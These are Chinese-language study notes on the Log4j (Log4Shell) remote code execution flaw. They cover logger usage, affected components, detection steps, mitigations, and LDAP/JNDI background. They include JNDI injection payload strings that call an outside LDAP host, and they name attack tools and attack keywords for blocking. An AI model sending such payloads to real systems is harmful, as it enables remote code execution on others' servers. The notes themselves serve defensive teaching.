# Log4j
- Log for Java
- Apache的开源日志记录组件，如：登入日志，交易，运行
- Log4j RCE漏洞，注入在于填写框与URL
- framework : springboot

#### 使用方法：
1. pom引入依赖
2. 代码里获得logger实列
    - Logger logger = LogManager.getLogger(Log4JT.class)
3. logger.info(), debug(), error(), warn()
    - Logger.class
### log4j影响范围和排查方法
- 工具：log4j_POC, marshalsec
- 受影响Apache组件: Archiva, Druidm Flink,... etc
- 排查方法：
  - pom版本排查
  - 通过日志查看是否存在dnslog.cn, jndi:ldap, jndi:rmi, 等攻击字符
  - 查看日志是否存在相关堆栈报错，如:jndiLookup, IdapURLContext, getObjectFactoryFromReference等
  - 工具：threatbook, allScanner, etc
### Log4j漏洞防御
1. 禁止用户请求参数出现攻击关键字，如：ldap,jndi, rmi, dnslog
2. 禁止lookup下载远程文件
3. 禁止log4j的应用连接外网
4. 禁止log4j使用lookup - 配置,如：noLookup
5. 从log4j jar包中删除lookup
6. 升级log4j版本到2.17
7. 使用安全产品防护: WAF, RASP, etc
8. 升级JDK
9. SpringBoot Starter, 重新引入依赖，重启应用
  - <properties><log4j2.version>2.17.1</log4j2....>....

## Lightweight Directory Access Protocol（LDAP）
- 轻量级目录访问协议 （目录服务）
- 案列：小镇电话簿，中国黄页
- 目录数据库 ：树型，
- LDAP可统一应用登入，如：Microsoft Active Directory, IBM Directory Server
- LDAP代码演示：LDAPSeriServer, LDAP client

## Java Naming Directory Interface (JNDI)
- Java命名和目录接口，命名服务接口
  - 用于根据名字找到位置，服务，信息，资源，对象
    - 发布服务: bind()
    - 用名字查找资源: lookup()
- 可以访问服务：LDAP, RMI, DNS,文件系统，XNam, Windows， etc
- 和JDBC代码流程一样
- ${jndi:ldap://wuya.com:2134/test}
- 通过名字，查找LDAP服务，获取LDAP里的数据
#### JNDI注入
1. 攻击者在http请求传入不存在的的资源，test
    - ${jndi:ldap://wuya.com:4678/test}
2. 受害者java应用的JND接口访问攻击者的LDAP目录服务里不存在的refClassName
3. LDAP找不到资源会去指定的地址访问远程地址
4. 访问远程路径会自动下载文件.class
5. 下载的.class文件包含无参构造函数或静态·方法快，加载的时候会自动码执行
